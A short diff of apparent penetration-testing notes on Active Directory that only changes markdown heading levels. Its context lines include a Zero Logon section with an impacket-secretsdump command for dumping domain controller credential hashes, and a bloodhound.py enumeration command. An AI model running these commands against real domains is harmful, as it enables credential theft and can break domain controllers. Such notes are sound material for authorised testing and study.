@@ -97,7 +97,7 @@ Now listen using tcpdump:
 
 It might take a few tries before you receive anything if you running over a vpn
 
-### Zero Logon
+## Zero Logon
 
 *Do not run this is a production environment as this may break the domain controller*
 
@@ -112,7 +112,7 @@ if the script confirms the vulnerability, we can use secretsdump to dump the NTD
 - `impacket-secretsdump <domain name>/<DC NAME>\$@<DC IP> -just-dc`
 - the `$` presents an empty value/string
 
-### If you have a Valid User(s) and or Password(s):
+# If you have a Valid User(s) and or Password(s):
 
 - `python3 [bloodhound.py](http://bloodhound.py) -ns <DC IP> -d <domain> -dc <DC hostname> -u <username> -p <password> -c All`
 
